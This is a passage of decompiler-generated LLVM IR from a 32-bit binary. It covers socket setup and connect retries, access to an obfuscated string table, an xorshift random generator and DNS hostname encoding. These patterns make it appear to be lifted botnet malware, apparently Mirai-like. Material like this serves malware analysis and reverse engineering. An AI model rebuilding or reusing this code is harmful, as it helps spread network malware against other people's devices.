  br i1 %v14_804e359, label %dec_label_pc_804e2ca, label %dec_label_pc_804e216

dec_label_pc_804e368:                             ; preds = %dec_label_pc_804e238
  %v1_804e368 = add i32 %v0_804e368, 1
  %v2_804e369 = load i32, i32* %v1_804e369, align 4
  %v14_804e369 = icmp eq i32 %v2_804e369, %v1_804e368
  br i1 %v14_804e369, label %dec_label_pc_804e2ca, label %dec_label_pc_804e24a

dec_label_pc_804e378:                             ; preds = %dec_label_pc_804e270
  %v1_804e378 = add i32 %v0_804e378, 1
  %v2_804e379 = load i32, i32* %v1_804e379, align 4
  %v14_804e379 = icmp eq i32 %v2_804e379, %v1_804e378
  br i1 %v14_804e379, label %dec_label_pc_804e2ca, label %dec_label_pc_804e282

dec_label_pc_804e388:                             ; preds = %dec_label_pc_804e2aa
  %v1_804e388 = add i32 %v0_804e388128, 1
  %v12_804e389 = icmp eq i32 %v3_804e288, %v1_804e388
  br i1 %v12_804e389, label %dec_label_pc_804e2ca, label %dec_label_pc_804e2a0.backedge

dec_label_pc_804e2a0.backedge:                    ; preds = %dec_label_pc_804e388, %dec_label_pc_804e2b9
  %v3_804e2b091 = phi i32 [ 0, %dec_label_pc_804e2b9 ], [ %v1_804e388, %dec_label_pc_804e388 ]
  %storemerge32.in = add i32 %v0_804e391129, 1
  %v1_804e2a0 = add i32 %v1_804e2a0131, -1
  store i32 %v1_804e2a0, i32* @ebx, align 4
  %v10_804e2a1 = icmp eq i32 %v1_804e2a0131, 0
  br i1 %v10_804e2a1, label %dec_label_pc_804e18c, label %dec_label_pc_804e2aa

dec_label_pc_804e397:                             ; preds = %dec_label_pc_804e18c
  %v2_804e39a = inttoptr i32 %v0_804e1a1 to i32*
  store i32 12, i32* %v2_804e39a, align 4
  %v2_804e39c = call i32 @function_80512d0(i8 0)
  store i32 %v2_804e39c, i32* %eax.global-to-local, align 4
  %v0_804e3a1 = load i32, i32* @esp, align 4
  %v1_804e3a1 = inttoptr i32 %v0_804e3a1 to i32*
  store i32 13, i32* %v1_804e3a1, align 4
  %v2_804e3a8 = call i32 @function_80512d0(i8 0)
  store i32 %v2_804e3a8, i32* %eax.global-to-local, align 4
  %v0_804e3ad = load i32, i32* @esp, align 4
  %v1_804e3ad = inttoptr i32 %v0_804e3ad to i32*
  store i32 14, i32* %v1_804e3ad, align 4
  %v2_804e3b4 = call i32 @function_80512d0(i8 0)
  store i32 %v2_804e3b4, i32* %eax.global-to-local, align 4
  %v0_804e3b9 = load i32, i32* @esp, align 4
  %v1_804e3b9 = inttoptr i32 %v0_804e3b9 to i32*
  store i32 15, i32* %v1_804e3b9, align 4
  %v2_804e3c0 = call i32 @function_80512d0(i8 0)
  store i32 %v2_804e3c0, i32* %eax.global-to-local, align 4
  %v0_804e3c5 = load i32, i32* @esp, align 4
  %v1_804e3c5 = inttoptr i32 %v0_804e3c5 to i32*
  store i32 16, i32* %v1_804e3c5, align 4
  %v2_804e3cc = call i32 @function_80512d0(i8 0)
  store i32 %v2_804e3cc, i32* %eax.global-to-local, align 4
  %v0_804e3d1 = load i32, i32* @esp, align 4
  %v1_804e3d1 = inttoptr i32 %v0_804e3d1 to i32*
  %v2_804e3d1 = load i32, i32* %v1_804e3d1, align 4
  store i32 %v2_804e3d1, i32* %eax.global-to-local, align 4
  %v1_804e3d2 = add i32 %v0_804e3d1, 56
  %v2_804e3d2 = inttoptr i32 %v1_804e3d2 to i32*
  %v3_804e3d2 = load i32, i32* %v2_804e3d2, align 4
  store i32 %v3_804e3d2, i32* @edi, align 4
  store i32 %v3_804e3d2, i32* %v1_804e3d1, align 4
  %v1_804e3d7 = call i32 @function_8052241(i32 0)
  store i32 %v1_804e3d7, i32* @eax, align 4
  %v0_804e3dc = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e31c

; uselistorder directives
  uselistorder i32 %v1_804e2a0, { 1, 0 }
  uselistorder i32 %v6_804e2ae, { 2, 0, 1 }
  uselistorder i32 %v0_804e391129, { 1, 0 }
  uselistorder i32 %v2_804e28f, { 1, 0 }
  uselistorder i32 %v3_804e288, { 1, 0, 2 }
  uselistorder i32 %v0_804e18c52, { 2, 1, 0 }
  uselistorder i32 %v0_804e297, { 0, 4, 5, 6, 3, 2, 1 }
  uselistorder i32 %v6_804e274, { 0, 2, 1 }
  uselistorder i32 %v0_804e378, { 1, 0 }
  uselistorder i32 %v0_804e263, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e25a, { 1, 0 }
  uselistorder i32 %v1_804e25a, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804e25a, { 1, 2, 3, 4, 7, 0, 8, 5, 6, 9 }
  uselistorder i32 %v0_804e250, { 1, 0 }
  uselistorder i32 %v6_804e23c, { 1, 0 }
  uselistorder i32 %v0_804e368, { 1, 0 }
  uselistorder i32 %v0_804e22f, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e226, { 1, 0 }
  uselistorder i32 %v0_804e226, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804e21c, { 1, 0 }
  uselistorder i32 %v6_804e208, { 1, 0 }
  uselistorder i32 %v0_804e358, { 1, 0 }
  uselistorder i32 %v0_804e1fb, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e1f2, { 1, 0 }
  uselistorder i32 %v0_804e1f2, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804e1e8, { 1, 0 }
  uselistorder i32 %v6_804e1d4, { 1, 0 }
  uselistorder i32 %v0_804e2c0, { 1, 0 }
  uselistorder i32 %v0_804e1c1, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e1b8, { 1, 0 }
  uselistorder i32 %v0_804e1b8, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_804e18c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804e0c7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e0a4, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_804e09f, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804e03a, { 1, 0 }
  uselistorder i32 %v0_804e031, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804e03a.pre, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_804e013, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804dfda, { 0, 2, 1 }
  uselistorder i32 %v4_804df95, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804df3a, { 2, 1, 0 }
  uselistorder i32 %v0_804def4, { 1, 0, 2 }
  uselistorder i32 %v1_804dea1, { 1, 0 }
  uselistorder i32 %v1_804de9e, { 2, 1, 0 }
  uselistorder i32 %v0_804de9e, { 1, 0, 2 }
  uselistorder i32 %v2_804de9c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804deb8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804de6d, { 1, 0 }
  uselistorder i32 %v1_804de6a, { 1, 0, 2 }
  uselistorder i32 %v0_804de5d, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804de58, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804de50, { 1, 0 }
  uselistorder i32 %v3_804dd85, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804dd43, { 1, 0, 2 }
  uselistorder i32 %v2_804dd2f, { 3, 2, 4, 0, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 %v1_804dcf2, { 0, 2, 1 }
  uselistorder i32 %v3_804dcb4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v3_804dc67, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804dc13, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-52, { 1, 2, 0 }
  uselistorder i32* %eax.global-to-local, { 129, 130, 131, 132, 133, 134, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 135, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128 }
  uselistorder i32 8424, { 1, 0 }
  uselistorder i32 ()* @function_8052594, { 2, 1, 0 }
  uselistorder i32 ()* @function_8052010, { 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_8051f90, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 18, 19, 20, 21, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 8264, { 0, 2, 1 }
  uselistorder i32 8328, { 0, 1, 3, 2 }
  uselistorder i32 ()* @function_80526f5, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_8052604, { 2, 1, 0 }
  uselistorder i32 4095, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_8051cc0, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 27, 28, 29, 30, 26, 31, 32, 33, 34, 58, 59, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 60, 61, 62, 63 }
  uselistorder i8 7, { 3, 4, 5, 6, 7, 1, 2, 0 }
  uselistorder label %dec_label_pc_804e31c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e2ca, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e2aa, { 1, 0 }
  uselistorder label %dec_label_pc_804e288, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e270, { 1, 0 }
  uselistorder label %dec_label_pc_804e250, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e238, { 1, 0 }
  uselistorder label %dec_label_pc_804e21c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e204, { 1, 0 }
  uselistorder label %dec_label_pc_804e1e8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e1d0, { 1, 0 }
  uselistorder label %dec_label_pc_804e18c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804e0c7, { 1, 0 }
  uselistorder label %dec_label_pc_804e0bb, { 1, 0 }
  uselistorder label %dec_label_pc_804e038, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dffd, { 1, 0 }
  uselistorder label %dec_label_pc_804de50, { 6, 3, 1, 0, 4, 5, 2, 7 }
  uselistorder label %dec_label_pc_804dde2, { 1, 0 }
  uselistorder label %dec_label_pc_804dce1, { 1, 0 }
  uselistorder label %dec_label_pc_804dc94, { 1, 0 }
}

define i32 @function_804e3f0() local_unnamed_addr {
dec_label_pc_804e3f0:
  store i32 134538560, i32* @global_var_8056874.24, align 4
  %v0_804e3fa = load i32, i32* @eax, align 4
  ret i32 %v0_804e3fa
}

define i32 @function_804e400() local_unnamed_addr {
dec_label_pc_804e400:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_804e413 = call i32 @function_8052a35(i32 2, i32 1, i32 0)
  store i32 %v3_804e413, i32* @global_var_805686c.25, align 4
  %v10_804e422 = icmp eq i32 %v3_804e413, -1
  br i1 %v10_804e422, label %dec_label_pc_804e4c0, label %dec_label_pc_804e42b

dec_label_pc_804e42b:                             ; preds = %dec_label_pc_804e400
  %v2_804e430 = ptrtoint i32* %stack_var_-12 to i32
  %v5_804e43a = call i32 @function_80529fa(i32 %v3_804e413, i32 1, i32 2, i32 %v2_804e430, i32 4)
  %v0_804e442 = load i32, i32* @global_var_805686c.25, align 4
  %v3_804e44c = call i32 @function_805217d(i32 %v0_804e442, i32 3, i32 0)
  %v12_804e454 = or i32 %v3_804e44c, 2048
  %v0_804e458 = load i32, i32* @global_var_805686c.25, align 4
  %v3_804e460 = call i32 @function_805217d(i32 %v0_804e458, i32 4, i32 %v12_804e454)
  %v0_804e46d = load i8, i8* @global_var_8056878.26, align 8
  %v1_804e46d = icmp eq i8 %v0_804e46d, 0
  br i1 %v1_804e46d, label %dec_label_pc_804e4c6, label %dec_label_pc_804e476

dec_label_pc_804e476:                             ; preds = %dec_label_pc_804e42b, %dec_label_pc_804e4c6
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804e488 = call i32 @function_8052779(i32 2)
  %v2_804e48d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v1_804e488, i32* @ebx, align 4
  %v1_804e493 = inttoptr i32 %v1_804e488 to i32*
  store i32 0, i32* %v1_804e493, align 4
  %v0_804e49a = load i32, i32* @global_var_805686c.25, align 4
  %v4_804e4a3 = call i32 @function_805282f(i32 %v0_804e49a, i32 %v2_804e48d, i32 16, i32 %v1_804e488)
  %v8_804e4ab = icmp eq i32 %v4_804e4a3, -1
  br i1 %v8_804e4ab, label %dec_label_pc_804e4d0, label %dec_label_pc_804e4ae

dec_label_pc_804e4ae:                             ; preds = %dec_label_pc_804e476
  %v0_804e4ae = load i32, i32* @global_var_805686c.25, align 4
  %v2_804e4b8 = call i32 @function_80528eb(i32 %v0_804e4ae, i32 1)
  br label %dec_label_pc_804e4c0

dec_label_pc_804e4c0:                             ; preds = %dec_label_pc_804e400, %dec_label_pc_804e4ae
  %v0_804e4c5 = phi i32 [ -1, %dec_label_pc_804e400 ], [ %v2_804e4b8, %dec_label_pc_804e4ae ]
  ret i32 %v0_804e4c5

dec_label_pc_804e4c6:                             ; preds = %dec_label_pc_804e42b
  br label %dec_label_pc_804e476

dec_label_pc_804e4d0:                             ; preds = %dec_label_pc_804e476
  %v0_804e4d0 = load i32, i32* @ebx, align 4
  %v1_804e4d0 = inttoptr i32 %v0_804e4d0 to i32*
  %v2_804e4d0 = load i32, i32* %v1_804e4d0, align 4
  %v11_804e4d0 = icmp eq i32 %v2_804e4d0, 99
  br i1 %v11_804e4d0, label %dec_label_pc_804e52e, label %dec_label_pc_804e4d5

dec_label_pc_804e4d5:                             ; preds = %dec_label_pc_804e4d0, %dec_label_pc_804e52e
  store i32 2, i32* %stack_var_-28, align 4
  %v0_804e4ef = load i32, i32* @global_var_805686c.25, align 4
  store i32 %v0_804e4ef, i32* @esi, align 4
  %v3_804e4f6 = call i32 @function_805285a(i32 %v0_804e4ef, i32 %v2_804e48d, i32 16)
  %v1_804e502 = call i32 @function_8053df0(i32 5)
  store i32 5, i32* @ebx, align 4
  %v0_804e508 = load i32, i32* @global_var_805686c.25, align 4
  %v1_804e50f = call i32 @function_8052241(i32 %v0_804e508)
  %v1_804e51b = call i32 @function_804d5e0(i32 58811)
  %v0_804e520 = call i32 @function_804e400()
  ret i32 %v0_804e520

dec_label_pc_804e52e:                             ; preds = %dec_label_pc_804e4d0
  store i8 0, i8* @global_var_8056878.26, align 8
  br label %dec_label_pc_804e4d5

; uselistorder directives
  uselistorder i32 %v3_804e413, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_804d5e0, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @function_80528eb, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_805282f, { 0, 2, 1 }
  uselistorder i8* @global_var_8056878.26, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_80529fa, { 1, 0 }
  uselistorder label %dec_label_pc_804e4d5, { 1, 0 }
  uselistorder label %dec_label_pc_804e4c0, { 1, 0 }
  uselistorder label %dec_label_pc_804e476, { 1, 0 }
}

define i32 @function_804e540() local_unnamed_addr {
dec_label_pc_804e540:
  %stack_var_-12 = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp4, i32* %stack_var_-12, align 4
  %stack_var_-28 = alloca i8*, align 4
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v3_804e547 = call i32 @function_8051350(i8 3)
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v4_804e552 = call i32 @function_80512a0(i32 3, i32* null)
  %v4_804e557 = inttoptr i32 %v4_804e552 to i8*
  store i8* %v4_804e557, i8** %stack_var_-28, align 4
  %v3_804e55a = call i32 @function_804f340(i8* %v4_804e557)
  store i32 %v3_804e55a, i32* @esi, align 4
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v3_804e568 = call i32 @function_80512d0(i8 3)
  %v2_804e570 = icmp eq i32 %v3_804e55a, 0
  br i1 %v2_804e570, label %dec_label_pc_804e5c6, label %dec_label_pc_804e574

dec_label_pc_804e574:                             ; preds = %dec_label_pc_804e540
  %v1_804e55f = inttoptr i32 %v3_804e55a to i8*
  %v2_804e574 = add i32 %v3_804e55a, 4
  %v3_804e574 = inttoptr i32 %v2_804e574 to i32*
  %v4_804e574 = load i32, i32* %v3_804e574, align 4
  store i32 %v4_804e574, i32* @ebx, align 4
  %v0_804e577 = load i8*, i8** %stack_var_-28, align 4
  %v1_804e577 = ptrtoint i8* %v0_804e577 to i32
  %v2_804e577 = call i32 @function_804f070(i32 %v1_804e577)
  %v3_804e577 = sext i32 %v2_804e577 to i64
  %v3_804e581 = load i8, i8* %v1_804e55f, align 1
  %v8_804e587 = zext i8 %v3_804e581 to i64
  %v11_804e587 = urem i64 %v3_804e577, %v8_804e587
  %v12_804e587 = trunc i64 %v11_804e587 to i32
  %v0_804e589 = load i32, i32* @ebx, align 4
  %v2_804e589 = mul nuw nsw i32 %v12_804e587, 4
  %v3_804e589 = add i32 %v2_804e589, %v0_804e589
  %v4_804e589 = inttoptr i32 %v3_804e589 to i32*
  %v5_804e589 = load i32, i32* %v4_804e589, align 4
  %tmp10 = bitcast i8** %stack_var_-28 to i32*
  store i32 %v3_804e55a, i32* %tmp10, align 4
  store i32 %v5_804e589, i32* @global_var_80569cc.28, align 4
  %v2_804e592 = call i32 @function_804f300(i32 %v3_804e55a)
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  %v3_804e59e = call i32 @function_8051350(i8 4)
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  %v4_804e5a9 = call i32 @function_80512a0(i32 4, i32* null)
  %v5_804e5a9 = inttoptr i32 %v4_804e5a9 to i16*
  %v3_804e5ae = load i16, i16* %v5_804e5a9, align 2
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  store i16 %v3_804e5ae, i16* bitcast (i32* @global_var_80569ca.29 to i16*), align 4
  %v3_804e5be = call i32 @function_80512d0(i8 4)
  %v2_804e5c6.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e5c6

dec_label_pc_804e5c6:                             ; preds = %dec_label_pc_804e540, %dec_label_pc_804e574
  %v2_804e5c6 = phi i32 [ %tmp4, %dec_label_pc_804e540 ], [ %v2_804e5c6.pre, %dec_label_pc_804e574 ]
  ret i32 %v2_804e5c6

; uselistorder directives
  uselistorder i32 %v3_804e55a, { 2, 1, 0, 5, 3, 4 }
  uselistorder i8** %stack_var_-28, { 7, 6, 5, 0, 8, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e5c6, { 1, 0 }
}

define i32 @function_804f070(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f070:
  %v0_804f070 = load i32, i32* @global_var_8056948.30, align 8
  %v0_804f078 = load i32, i32* @global_var_8056954.31, align 4
  %v2_804f07e = mul i32 %v0_804f070, 2048
  %v2_804f083 = udiv i32 %v0_804f078, 524288
  store i32 %v2_804f083, i32* @ecx, align 4
  %v2_804f086 = xor i32 %v2_804f07e, %v0_804f070
  %v0_804f088 = load i32, i32* @global_var_805694c.32, align 4
  store i32 %v0_804f088, i32* @global_var_8056948.30, align 8
  %v0_804f092 = load i32, i32* @global_var_8056950.33, align 16
  store i32 %v0_804f092, i32* @global_var_805694c.32, align 4
  store i32 %v0_804f078, i32* @global_var_8056950.33, align 16
  %v2_804f0a4 = xor i32 %v2_804f083, %v0_804f078
  %v2_804f0a6 = udiv i32 %v2_804f086, 256
  %v2_804f0a9 = xor i32 %v2_804f0a6, %v2_804f086
  %v2_804f0ab = xor i32 %v2_804f0a9, %v2_804f0a4
  store i32 %v2_804f0ab, i32* @global_var_8056954.31, align 4
  ret i32 %v2_804f0ab

; uselistorder directives
  uselistorder i32 %v2_804f086, { 1, 0 }
  uselistorder i32 %v2_804f083, { 1, 0 }
  uselistorder i32 %v0_804f078, { 1, 2, 0 }
  uselistorder i32 %v0_804f070, { 1, 0 }
}

define i32 @function_804f300(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f300:
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %v0_804f300 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f308 = icmp eq i32 %arg1, 0
  br i1 %v1_804f308, label %dec_label_pc_804f300.dec_label_pc_804f330_crit_edge, label %dec_label_pc_804f30c

dec_label_pc_804f300.dec_label_pc_804f330_crit_edge: ; preds = %dec_label_pc_804f300
  br label %dec_label_pc_804f330

dec_label_pc_804f30c:                             ; preds = %dec_label_pc_804f300
  %v1_804f30c = add i32 %arg1, 4
  %v2_804f30c = inttoptr i32 %v1_804f30c to i32*
  %v3_804f30c = load i32, i32* %v2_804f30c, align 4
  %v1_804f30f = icmp eq i32 %v3_804f30c, 0
  br i1 %v1_804f30f, label %dec_label_pc_804f31f, label %dec_label_pc_804f313

dec_label_pc_804f313:                             ; preds = %dec_label_pc_804f30c
  %v1_804f317 = call i32 @function_8053999(i32 %v3_804f30c)
  br label %dec_label_pc_804f31f

dec_label_pc_804f31f:                             ; preds = %dec_label_pc_804f30c, %dec_label_pc_804f313
  store i32 %v0_804f300, i32* @ebx, align 4
  %v1_804f326 = call i32 @function_8053999(i32 %arg1)
  %v2_804f330.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804f330

dec_label_pc_804f330:                             ; preds = %dec_label_pc_804f300.dec_label_pc_804f330_crit_edge, %dec_label_pc_804f31f
  %v2_804f330 = phi i32 [ %tmp12, %dec_label_pc_804f300.dec_label_pc_804f330_crit_edge ], [ %v2_804f330.pre, %dec_label_pc_804f31f ]
  store i32 %v0_804f300, i32* @ebx, align 4
  ret i32 %v2_804f330

; uselistorder directives
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804f330, { 1, 0 }
  uselistorder label %dec_label_pc_804f31f, { 1, 0 }
}

define i32 @function_804f340(i8* %arg1) local_unnamed_addr {
dec_label_pc_804f340:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-2207 = alloca i32, align 4
  %stack_var_-2208 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_804f34c = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f34c, i32* @ebx, align 4
  %v4_804f357 = call i32 @function_8053348(i64 1, i32 8)
  %v2_804f360 = ptrtoint i32* %stack_var_-2208 to i32
  store i32 %v2_804f360, i32* %eax.global-to-local, align 4
  %tmp102 = bitcast i32* %stack_var_-2208 to i8*
  %v0_804f36b = load i32, i32* @ebx, align 4
  %v4_804f36b = inttoptr i32 %v0_804f36b to i8*
  %v3_804f36e = call i32 @function_8051ca0(i8* %v4_804f36b)
  %v2_804f373 = ptrtoint i32* %stack_var_-2207 to i32
  store i32 %v2_804f373, i32* %ecx.global-to-local, align 4
  store i32 %v2_804f360, i32* %edi.global-to-local, align 4
  %v1_804f37e = add i32 %v3_804f36e, 1
  store i32 %v1_804f37e, i32* %eax.global-to-local, align 4
  %tmp103 = icmp slt i32 %v1_804f37e, 1
  br i1 %tmp103, label %dec_label_pc_804f3aa, label %dec_label_pc_804f392.lr.ph

dec_label_pc_804f392.lr.ph:                       ; preds = %dec_label_pc_804f340
  %v0_804f392.pre = load i32, i32* @ebx, align 4
  %v4_804f392.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f392

dec_label_pc_804f384:                             ; preds = %dec_label_pc_804f399
  %v3_804f384 = inttoptr i32 %v2_804f384 to i8*
  store i8 %v2_804f392, i8* %v3_804f384, align 1
  %v0_804f386 = load i32, i32* @esi, align 4
  %v1_804f386 = add i32 %v0_804f386, 1
  store i32 %v1_804f386, i32* @esi, align 4
  %v0_804f387 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f387 = add i32 %v0_804f387, 1
  store i32 %v1_804f387, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f38a

dec_label_pc_804f38a:                             ; preds = %dec_label_pc_804f39d, %dec_label_pc_804f384
  %v0_804f38c = phi i32 [ %v1_804f3a3, %dec_label_pc_804f39d ], [ %v1_804f387, %dec_label_pc_804f384 ]
  %v0_804f38a = load i32, i32* @ebx, align 4
  %v1_804f38a = add i32 %v0_804f38a, 1
  store i32 %v1_804f38a, i32* @ebx, align 4
  %v0_804f38b = load i32, i32* %eax.global-to-local, align 4
  %v1_804f38b = add i32 %v0_804f38b, -1
  store i32 %v1_804f38b, i32* %eax.global-to-local, align 4
  store i32 %v0_804f38c, i32* %ecx.global-to-local, align 4
  %tmp104 = icmp slt i32 %v1_804f38b, 1
  br i1 %tmp104, label %dec_label_pc_804f38e.dec_label_pc_804f3aa_crit_edge, label %dec_label_pc_804f392

dec_label_pc_804f392:                             ; preds = %dec_label_pc_804f392.lr.ph, %dec_label_pc_804f38a
  %v2_804f384 = phi i32 [ %v2_804f373, %dec_label_pc_804f392.lr.ph ], [ %v0_804f38c, %dec_label_pc_804f38a ]
  %v4_804f392 = phi i32 [ %v4_804f392.pre, %dec_label_pc_804f392.lr.ph ], [ %v0_804f38c, %dec_label_pc_804f38a ]
  %v0_804f392 = phi i32 [ %v0_804f392.pre, %dec_label_pc_804f392.lr.ph ], [ %v1_804f38a, %dec_label_pc_804f38a ]
  %v1_804f392 = inttoptr i32 %v0_804f392 to i8*
  %v2_804f392 = load i8, i8* %v1_804f392, align 1
  %v3_804f392 = zext i8 %v2_804f392 to i32
  %v5_804f392 = and i32 %v4_804f392, -256
  %v6_804f392 = or i32 %v3_804f392, %v5_804f392
  store i32 %v6_804f392, i32* %edx.global-to-local, align 4
  %v10_804f394 = icmp eq i8 %v2_804f392, 46
  br i1 %v10_804f394, label %dec_label_pc_804f39d, label %dec_label_pc_804f399

dec_label_pc_804f399:                             ; preds = %dec_label_pc_804f392
  %v4_804f399 = icmp eq i8 %v2_804f392, 0
  %v1_804f39b = icmp eq i1 %v4_804f399, false
  br i1 %v1_804f39b, label %dec_label_pc_804f384, label %dec_label_pc_804f39d

dec_label_pc_804f39d:                             ; preds = %dec_label_pc_804f399, %dec_label_pc_804f392
  %v0_804f39d = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v1_804f3a1 = trunc i32 %v0_804f39d to i8
  %v2_804f3a1 = load i32, i32* %edi.global-to-local, align 4
  %v3_804f3a1 = inttoptr i32 %v2_804f3a1 to i8*
  store i8 %v1_804f3a1, i8* %v3_804f3a1, align 1
  %v0_804f3a3 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f3a3 = add i32 %v0_804f3a3, 1
  store i32 %v1_804f3a3, i32* %edx.global-to-local, align 4
  store i32 %v0_804f3a3, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f38a

dec_label_pc_804f38e.dec_label_pc_804f3aa_crit_edge: ; preds = %dec_label_pc_804f38a
  br label %dec_label_pc_804f3aa

dec_label_pc_804f3aa:                             ; preds = %dec_label_pc_804f38e.dec_label_pc_804f3aa_crit_edge, %dec_label_pc_804f340
  %v0_804f3ad = phi i32 [ %v0_804f38c, %dec_label_pc_804f38e.dec_label_pc_804f3aa_crit_edge ], [ %v2_804f373, %dec_label_pc_804f340 ]
  %v1_804f3ad = inttoptr i32 %v0_804f3ad to i8*
  store i8 0, i8* %v1_804f3ad, align 1
  store i32 %v2_804f360, i32* %eax.global-to-local, align 4
  %v3_804f3b5 = call i32 @function_8051ca0(i8* %tmp102)
  store i32 0, i32* %stack_var_-44, align 4
  %v2_804f3c9 = add i32 %v3_804f3b5, %v2_804f360
  store i32 %v2_804f3c9, i32* @edi, align 4
  %v1_804f3ed = add i32 %v2_804f3c9, 1
  store i32 %v1_804f3ed, i32* @ebx, align 4
  store i32 %v2_804f360, i32* %eax.global-to-local, align 4
  %v3_804f3f5 = call i32 @function_8051ca0(i8* %tmp102)
  %v1_804f3fa = add i32 %v3_804f3f5, 17
  store i32 %v1_804f3fa, i32* %eax.global-to-local, align 4
  %v1_804f401 = call i32 @function_804f070(i32 %v1_804f3fa)
  %v2_804f40f = udiv i32 %v1_804f401, 65535
  store i32 %v2_804f40f, i32* %edx.global-to-local, align 4
  %v2_804f41979 = add i32 %v2_804f40f, %v1_804f401
  store i32 %v2_804f41979, i32* @esi, align 4
  store i32 8, i32* @eax, align 4
  store i32 -1, i32* %ebp.global-to-local, align 4
  %v2_804f429 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804f429, i32* %ecx.global-to-local, align 4
